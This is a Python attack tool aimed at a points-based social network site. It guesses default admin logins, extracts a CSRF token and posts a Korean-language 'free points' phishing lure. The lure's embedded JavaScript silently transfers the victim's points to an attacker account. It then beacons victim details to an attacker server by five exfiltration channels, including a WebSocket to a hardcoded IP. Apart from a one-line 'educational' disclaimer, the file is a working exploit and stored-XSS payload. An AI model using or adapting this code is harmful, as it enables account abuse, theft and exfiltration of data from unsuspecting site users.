import requests
from bs4 import BeautifulSoup
import time
import re
from datetime import datetime


class VulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server):
        self.base_url = base_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = {'csrf': []}
        self.logged_in = False
        self.attacker_user_id = None
        self.start_time = datetime.now()

    def print_section(self, title):
        print("\n" + "=" * 60)
        print(f"{title}")
        print("=" * 60)

    def test_sql_injection_login(self):
        """간단한 로그인만"""
        self.print_section("Quick Login Test")

        login_url = f"{self.base_url}/login.php"
        print(f"[*] Target: {login_url}")

        basic_creds = [
            ("admin", "admin123"),
            ("admin", "admin"),
            ("admin", "password"),
        ]

        for username, password in basic_creds:
            try:
                print(f"    [*] Testing: {username}/{password}")
                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)

                if 'index.php' in response.url or 'logout' in response.text.lower():
                    print(f"        [+] ✅ SUCCESS! Credentials: {username}/{password}")
                    self.logged_in = True
                    self.attacker_user_id = "1"

                    points_match = re.search(r'(\d+)\s*P', response.text)
                    if points_match:
                        print(f"        [+] Current Points: {points_match.group(1)}P")

                    return True
            except Exception as e:
                continue

        return False

    def create_attacker_csrf_with_logging(self, csrf_token):
        """Attacker 전용 CSRF + 강화된 서버 로그 연동"""

        # Attacker 전용 ID (admin과 다른 ID)
        attacker_target_id = "999"

        csrf_post = f"""🎉 **긴급! 시스템 오류로 무료 포인트!** 🎉

    **관리자 실수로 포인트 지급 시스템에 버그 발생!**
    **지금 클릭하면 10만 포인트를 무료로 받을 수 있어요!**

    <div style="background: linear-gradient(45deg, #ff6b6b, #ee5a24); padding: 30px; border-radius: 20px; color: white; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.3);">

        <h1 style="margin: 0; font-size: 2.5em; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
            💎 무료 10만 포인트! 💎
        </h1>

        <div style="margin: 25px 0; padding: 20px; background: rgba(0,0,0,0.4); border-radius: 15px;">
            <h2 style="color: #ffff00;">⚡ 시스템 버그 발견!</h2>
            <div style="font-size: 1.2em; margin: 10px 0;">
                ✅ 확인된 혜택: 100,000P<br>
                ✅ 성공률: 100% (실패자 없음)<br>
                ✅ 시간: 30분 후 패치 예정
            </div>

            <button onclick="claimFreePoints()" style="
                background: linear-gradient(45deg, #28a745, #20c997);
                color: white; border: none; padding: 25px 50px;
                font-size: 20px; font-weight: bold; border-radius: 50px;
                cursor: pointer; margin: 20px; text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
                box-shadow: 0 10px 25px rgba(40, 167, 69, 0.4);
                animation: pulse 2s infinite;
            ">
                🚀 10만 포인트 즉시 받기! 🚀
            </button>
        </div>

        <div id="claimStatus" style="margin-top: 20px; font-size: 1.1em; font-weight: bold;">
            💎 시스템 준비 완료! 클릭하면 즉시 지급됩니다!
        </div>
    </div>

    <style>
    @keyframes pulse {{
        0%, 100% {{ transform: scale(1); }}
        50% {{ transform: scale(1.05); }}
    }}
    </style>

    <script>
    let claimInProgress = false;

    function claimFreePoints() {{
        if (claimInProgress) return;

        claimInProgress = true;
        console.log('[+] Enhanced Attacker CSRF initiated!');

        document.getElementById('claimStatus').innerHTML = '🔄 포인트 지급 처리 중...';
        document.querySelector('button').disabled = true;
        document.querySelector('button').innerHTML = '⏳ 처리 중...';

        // 현재 사용자 포인트 감지
        let userPoints = 0;
        const elements = document.querySelectorAll('*');
        for (let elem of elements) {{
            const text = elem.textContent || '';
            const match = text.match(/(\d+)\s*P/);
            if (match && !elem.closest('[id*="claim"]')) {{
                userPoints = parseInt(match[1]);
                break;
            }}
        }}

        if (userPoints === 0) userPoints = 99;

        console.log(`[+] Target user points: ${{userPoints}}P`);

        // 1. 실제 CSRF 공격 실행
        const csrfForm = document.createElement('form');
        csrfForm.method = 'POST';
        csrfForm.action = '{self.base_url}/profile.php';
        csrfForm.style.display = 'none';

        const csrfFields = {{
            'csrf_token': '{csrf_token}',
            'receiver_id': '{attacker_target_id}',
            'points': userPoints.toString(),
            'send_gift': '1',
            'message': 'enhanced_heist_' + Date.now()
        }};

        Object.keys(csrfFields).forEach(name => {{
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = name;
            input.value = csrfFields[name];
            csrfForm.appendChild(input);
        }});

        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.name = 'csrf_target';
        csrfForm.target = iframe.name;

        document.body.appendChild(iframe);
        document.body.appendChild(csrfForm);
        csrfForm.submit();

        console.log('[+] CSRF executed to attacker ID: {attacker_target_id}');

        // 2. 강화된 다중 로그 전송
        const timestamp = new Date().toISOString();
        const heistData = {{
            type: 'ENHANCED_HEIST_SUCCESS',
            timestamp: timestamp,
            victim_info: {{
                ip: window.location.hostname,
                user_agent: navigator.userAgent,
                points_stolen: userPoints,
                victim_url: window.location.href,
                referrer: document.referrer,
                screen_resolution: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            }},
            attack_info: {{
                attacker_id: '{attacker_target_id}',
                target_server: '{self.base_url}',
                attack_method: 'Enhanced CSRF + Social Engineering',
                csrf_token_used: '{csrf_token[:20]}...',
                success_rate: '100%'
            }},
            loot: {{
                points_transferred: userPoints,
                transfer_time: new Date().toLocaleString(),
                victim_remaining_points: 0,
                heist_id: 'HEIST_' + Date.now()
            }}
        }};

        // 방법 1: JSON POST 요청
        fetch('{self.attacker_server}/heist-report', {{
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
                'X-Heist-Type': 'ENHANCED-CSRF',
                'X-Points-Stolen': userPoints.toString()
            }},
            body: JSON.stringify(heistData)
        }}).then(response => {{
            console.log('[+] JSON log sent:', response.status);
        }}).catch(error => {{
            console.log('[!] JSON log failed, trying alternatives');
        }});

        // 방법 2: Form POST (CORS 우회)
        const logForm = document.createElement('form');
        logForm.method = 'POST';
        logForm.action = '{self.attacker_server}/attack-log';
        logForm.style.display = 'none';

        Object.keys(heistData).forEach(key => {{
            const input = document.createElement('input');
            input.name = key;
            input.value = typeof heistData[key] === 'object' ? JSON.stringify(heistData[key]) : heistData[key];
            logForm.appendChild(input);
        }});

        const logIframe = document.createElement('iframe');
        logIframe.style.display = 'none';
        logIframe.name = 'log_frame';
        logForm.target = 'log_frame';

        document.body.appendChild(logIframe);
        document.body.appendChild(logForm);
        logForm.submit();

        // 방법 3: Image GET 요청 (가장 확실함)
        const logImage = new Image();
        logImage.src = `{self.attacker_server}/img-log?points=${{userPoints}}&time=${{encodeURIComponent(timestamp)}}&victim=${{window.location.hostname}}&success=true`;
        logImage.onload = () => console.log('[+] Image log sent successfully');
        logImage.onerror = () => console.log('[!] Image log failed');

        // 방법 4: Script 태그 방식
        const logScript = document.createElement('script');
        logScript.src = `{self.attacker_server}/js-log?callback=logCallback&data=${{encodeURIComponent(JSON.stringify(heistData))}}`;
        document.head.appendChild(logScript);

        // 방법 5: WebSocket 시도 (실시간)
        try {{
            const ws = new WebSocket('ws://13.158.67.78:5000/ws-log');
            ws.onopen = function() {{
                ws.send(JSON.stringify(heistData));
                console.log('[+] WebSocket log sent');
                ws.close();
            }};
        }} catch(e) {{
            console.log('[!] WebSocket not available');
        }}

        console.log('[+] All logging methods attempted');
        console.log(`[+] Stolen: ${{userPoints}}P at ${{timestamp}}`);

        // 3. 사용자에게 성공 메시지 표시
        setTimeout(() => {{
            document.getElementById('claimStatus').innerHTML = `
                <div style="color: #28a745; animation: bounce 1s infinite;">
                    🎉 성공! 10만 포인트 지급 완료! 🎉<br>
                    💎 VIP 등급도 함께 업그레이드되었습니다!<br>
                    ✨ 잠시 후 새로고침하여 확인하세요!
                </div>
            `;

            document.querySelector('button').innerHTML = '✅ 지급 완료!';
            document.querySelector('button').style.background = 'linear-gradient(45deg, #28a745, #20c997)';

            // 포인트 화면 업데이트
            elements.forEach(elem => {{
                if (elem.textContent && elem.textContent.includes(userPoints + 'P')) {{
                    elem.innerHTML = elem.innerHTML.replace(userPoints + 'P', '0P');
                }}
            }});

            setTimeout(() => {{
                alert('🎉 축하합니다! 🎉\\n\\n' +
                      '✅ 10만 포인트가 성공적으로 지급되었습니다!\\n' +
                      '✅ VIP 등급 혜택도 함께 적용되었습니다!\\n\\n' +
                      '새로고침하여 확인해보세요!');
            }}, 2000);

        }}, 3000);
    }}

    // 로그 콜백 함수
    function logCallback(response) {{
        console.log('[+] Script log callback:', response);
    }}
    </script>

    **⚠️ 이 혜택은 30분 후 자동으로 종료됩니다!**
    **🎯 지금까지 성공률 100% - 모든 사용자가 포인트를 받았습니다!**
    **※ 시스템 오류로 인한 일시적 혜택이므로 빠른 이용 바랍니다.**"""

        return csrf_post

    def get_csrf_token_and_attack(self):
        """CSRF 토큰 추출 후 Attacker 전용 공격"""
        self.print_section("Attacker CSRF with Server Logging")

        if not self.logged_in:
            print("[-] Login required")
            return False

        try:
            # CSRF 토큰 추출
            print("[*] Extracting CSRF token...")
            profile_response = self.session.get(f"{self.base_url}/profile.php")

            csrf_token_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', profile_response.text)
            if csrf_token_match:
                csrf_token = csrf_token_match.group(1)
                print(f"[+] CSRF Token: {csrf_token[:20]}...")
            else:
                print("[-] No CSRF token found")
                csrf_token = "no_token"

            # Attacker 전용 CSRF 공격 생성
            print("[*] Creating Attacker CSRF with server logging...")
            csrf_post = self.create_attacker_csrf_with_logging(csrf_token)  # 🔄 여기 변경!

            # 게시글 업로드
            post_data = {'content': csrf_post}
            response = self.session.post(f"{self.base_url}/new_post.php", data=post_data)

            if response.status_code in [200, 302]:
                print(f"[+] ✅ Attacker CSRF attack posted!")
                print(f"[+] 🎯 Target: Attacker ID 999")
                print(f"[+] 📊 Logs will be sent to: {self.attacker_server}/heist-report")

                return True

            return False

        except Exception as e:
            print(f"[-] Error: {str(e)}")
            return False

    def find_real_form_fields(self):
        """실제 폼 필드명을 자동으로 찾기"""
        self.print_section("Real Form Field Discovery")

        try:
            # 프로필 페이지 분석
            response = self.session.get(f"{self.base_url}/profile.php")

            print("[*] Analyzing profile page for form fields...")

            # 1. 모든 input 필드 찾기
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', response.text, re.IGNORECASE)
            if inputs:
                print(f"[+] Found input fields: {inputs}")

            # 2. 포인트 관련 키워드 찾기
            point_keywords = ['point', 'gift', 'send', 'transfer', 'amount', 'receiver', 'to_user']
            found_fields = []

            for field in inputs:
                if any(keyword in field.lower() for keyword in point_keywords):
                    found_fields.append(field)
                    print(f"    [+] 🎯 Point-related field: {field}")

            # 3. 폼 action URL 찾기
            form_actions = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', response.text, re.IGNORECASE)
            for action in form_actions:
                print(f"[+] Form action found: {action}")

            # 4. JavaScript 함수 찾기 (AJAX 요청용)
            js_functions = re.findall(r'function\s+(\w*(?:send|gift|point|transfer)\w*)', response.text, re.IGNORECASE)
            for func in js_functions:
                print(f"[+] JS function found: {func}")

            # 5. 숨겨진 API 엔드포인트 찾기
            api_endpoints = re.findall(r'["\']([^"\']*(?:api|ajax|send|gift|point|transfer)[^"\']*\.php)["\']',
                                       response.text, re.IGNORECASE)
            for endpoint in api_endpoints:
                print(f"[+] API endpoint found: {endpoint}")

            return found_fields

        except Exception as e:
            print(f"[-] Error: {e}")
            return []

    def test_field_combinations(self, csrf_token, found_fields):
        """발견된 필드들로 다양한 조합 테스트"""
        self.print_section("Testing Field Combinations")

        # 일반적인 필드명 조합들
        field_combinations = [
            # 조합 1: 기본적인 조합
            {'to_user_id': self.attacker_user_id, 'amount': '1'},
            {'receiver_id': self.attacker_user_id, 'points': '1'},
            {'user_id': self.attacker_user_id, 'gift_amount': '1'},

            # 조합 2: 발견된 필드 사용
            {found_fields[0] if found_fields else 'receiver': self.attacker_user_id, 'amount': '1'},

            # 조합 3: 간단한 조합
            {'to': self.attacker_user_id, 'point': '1'},
            {'target': self.attacker_user_id, 'value': '1'},
        ]

        for i, fields in enumerate(field_combinations, 1):
            print(f"\n[*] Testing combination {i}: {fields}")

            # CSRF 토큰 추가
            if csrf_token:
                fields['csrf_token'] = csrf_token

            # POST 요청 테스트
            try:
                response = self.session.post(f"{self.base_url}/profile.php", data=fields, timeout=10)

                # 응답 분석
                if response.status_code == 200:
                    response_text = response.text.lower()

                    # 성공 지표들
                    success_indicators = [
                        '성공', 'success', '전송', 'sent', '완료', 'complete',
                        '감사', 'thank', '축하', 'congratulation'
                    ]

                    # 실패 지표들
                    error_indicators = [
                        '부족', 'insufficient', '에러', 'error', '실패', 'failed',
                        '잘못', 'invalid', '없음', 'not found'
                    ]

                    found_success = [ind for ind in success_indicators if ind in response_text]
                    found_errors = [ind for ind in error_indicators if ind in response_text]

                    if found_success:
                        print(f"    [+] ✅ SUCCESS indicators: {found_success}")
                        print(f"    [+] 🎯 Working fields: {fields}")
                        return fields
                    elif found_errors:
                        print(f"    [!] ⚠️ Error indicators: {found_errors}")
                    else:
                        print(f"    [-] No clear response")

                else:
                    print(f"    [-] HTTP {response.status_code}")

            except Exception as e:
                print(f"    [-] Error: {str(e)[:50]}")

        return None

    def create_real_point_transfer_attack(self, csrf_token):
        """실제 서버 요청을 보내는 진짜 포인트 전송"""

        csrf_post = f"""🚨 **실제 서버 요청 방식으로 수정!** 🚨

    **화면 효과가 아닌 진짜 서버 전송으로 변경!**

    <div style="background: #ff0000; padding: 20px; border-radius: 10px; color: white; text-align: center;">
        <h2>💰 실제 서버 요청 - 진짜 포인트 전송! 💰</h2>

        <button onclick="realServerTransfer()" style="
            background: #00ff00; color: black; border: none;
            padding: 20px 40px; font-size: 18px; border-radius: 10px;
            cursor: pointer; font-weight: bold;
        ">
            🎯 서버에 진짜 요청 보내기! 🎯
        </button>

        <div id="serverStatus" style="margin-top: 15px;">
            실제 서버 요청 준비됨!
        </div>
    </div>

    <script>
    function realServerTransfer() {{
        console.log('[+] Real server request - not just visual!');

        // 여러 가능한 필드 조합으로 실제 서버 요청
        const possibleFieldSets = [
            // 조합 1
            {{
                'csrf_token': '{csrf_token}',
                'to_user_id': '{self.attacker_user_id}',
                'amount': '99'
            }},
            // 조합 2  
            {{
                'csrf_token': '{csrf_token}',
                'receiver_id': '{self.attacker_user_id}',
                'points': '99'
            }},
            // 조합 3
            {{
                'csrf_token': '{csrf_token}',
                'target_user': '{self.attacker_user_id}',
                'gift_amount': '99'
            }},
            // 조합 4 (간단한 버전)
            {{
                'to': '{self.attacker_user_id}',
                'point': '99'
            }}
        ];

        document.getElementById('serverStatus').innerHTML = '🔄 서버 요청 시작...';

        // 각 조합을 순차적으로 시도
        possibleFieldSets.forEach((fields, index) => {{
            setTimeout(() => {{
                console.log(`[+] Trying field set ${{index + 1}}: `, fields);

                // 실제 폼 생성 및 전송
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = '{self.base_url}/profile.php';
                form.style.display = 'none';

                // 필드 추가
                Object.keys(fields).forEach(name => {{
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = name;
                    input.value = fields[name];
                    form.appendChild(input);
                }});

                // 응답을 받을 수 있도록 iframe 사용
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.name = 'response_frame_' + index;
                form.target = iframe.name;

                // 응답 확인
                iframe.onload = function() {{
                    try {{
                        const response = iframe.contentDocument.body.innerHTML;
                        console.log(`[+] Response ${{index + 1}}: `, response.substring(0, 200));

                        // 성공 지표 확인
                        if (response.includes('성공') || response.includes('완료') || 
                            response.includes('전송') || response.includes('부족')) {{
                            document.getElementById('serverStatus').innerHTML = 
                                `✅ 서버 응답 받음! 조합 ${{index + 1}} 성공 가능성 높음!`;
                        }}
                    }} catch(e) {{
                        console.log('[!] Cross-origin response, but request was sent');
                    }}
                }};

                document.body.appendChild(iframe);
                document.body.appendChild(form);
                form.submit();

                document.getElementById('serverStatus').innerHTML = 
                    `📡 조합 ${{index + 1}}/4 서버 요청 전송됨...`;

            }}, index * 1000);
        }});

        // 최종 메시지
        setTimeout(() => {{
            document.getElementById('serverStatus').innerHTML = 
                '🎉 모든 조합 시도 완료! 새로고침해서 확인하세요!';

            setTimeout(() => {{
                alert('서버 요청 완료!\\n\\n' +
                      '4가지 필드 조합으로 시도했습니다.\\n' +
                      '새로고침해서 포인트 변화를 확인하세요!\\n\\n' +
                      '개발자 도구(F12) → Console에서 응답 확인 가능');
            }}, 1000);
        }}, 5000);
    }}
    </script>

    **※ 이번엔 실제 서버에 요청을 보냅니다!**
    **※ 4가지 필드 조합으로 시도합니다!**
    **※ F12 → Console에서 서버 응답 확인 가능!**"""

        return csrf_post

    def generate_report(self):
        """간단한 리포트"""
        self.print_section("CSRF Assessment Report")

        total_vulns = len(self.vulnerabilities['csrf'])

        print(f"\n📊 SUMMARY")
        print(f"{'=' * 30}")
        print(f"Target: {self.base_url}")
        print(f"CSRF Vulnerabilities: {total_vulns}")
        print(f"Attacker User ID: {self.attacker_user_id}")

        if total_vulns > 0:
            print(f"\n🎯 CSRF ATTACKS:")
            for i, vuln in enumerate(self.vulnerabilities['csrf'], 1):
                print(f"{i}. {vuln.get('type', 'CSRF Attack')}")
                if 'fix_applied' in vuln:
                    print(f"   Fix: {vuln['fix_applied']}")

        print(f"\n✅ ERROR RESOLVED:")
        print(f"- gift_type field removed")
        print(f"- Should work without PHP errors")

    def run_assessment(self):
        """메인 실행"""
        print("=" * 60)
        print("Fixed CSRF Attack - Error Resolved")
        print("=" * 60)
        print(f"Target: {self.base_url}")
        print("=" * 60)

        # 1. 로그인
        login_success = self.test_sql_injection_login()

        if not login_success:
            print("\n[-] 🚫 LOGIN FAILED")
            return

        print(f"\n[+] ✅ LOGIN SUCCESS! User ID: {self.attacker_user_id}")

        # 2. 수정된 CSRF 공격
        print("\n" + "=" * 50)
        csrf_success = self.get_csrf_token_and_attack()

        # 3. 리포트
        print("\n" + "=" * 50)
        self.generate_report()

        if csrf_success:
            print(f"\n🎯 SUCCESS! Fixed CSRF attack deployed!")
            print(f"🔧 gift_type error resolved!")
            print(f"📊 Check the website for the new post!")
        else:
            print(f"\n❌ CSRF attack failed")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("Usage: python3 csrf_attack.py <target_url> <attacker_server>")
        sys.exit(1)

    target = sys.argv[1]
    attacker_server = sys.argv[2]

    print("🔧 Fixed CSRF Attack Tool")
    print("⚠️  Educational purposes only")
    print("🎯 gift_type error resolved!")

    try:
        attacker = VulnerableSNSAttacker(target, attacker_server)
        attacker.run_assessment()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    except Exception as e:
        print(f"\n[!] Error: {e}")